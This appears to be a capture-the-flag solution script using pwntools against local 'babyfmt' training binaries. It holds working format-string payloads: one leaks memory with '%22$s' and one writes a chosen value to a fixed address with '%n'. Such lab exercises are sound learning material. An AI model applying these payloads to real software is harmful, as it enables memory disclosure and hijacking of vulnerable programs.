#!/usr/bin/python
from pwn import *


def level_3_1(p):
    '''put address we want to leak on stack which ends up as 22nd argument'''
    p.sendafter('Send your data!', b'%22$s       ' + p64(0x4040c0 + 0x70))

def level_4_0(p):
    '''Write 0xd8 (216) to 0x404100 which we place at 26th argument. '.' padding is
       to make sure the address ends up in it's own 64 bit 'argument' (31st). 
    '''
    data = b'%216x%31$n.......' + p64(0x404100)
    p.sendafter('Send your data!', data)


level = 4.0
p = process(f'/challenge/babyfmt_level{level}')
#p = gdb.debug(f'./babyfmt_level{level}', '''
#b read
#c
        
#disable 1
#b printf
#c
#c
#c
#''')

level_4_0(p)

p.interactive()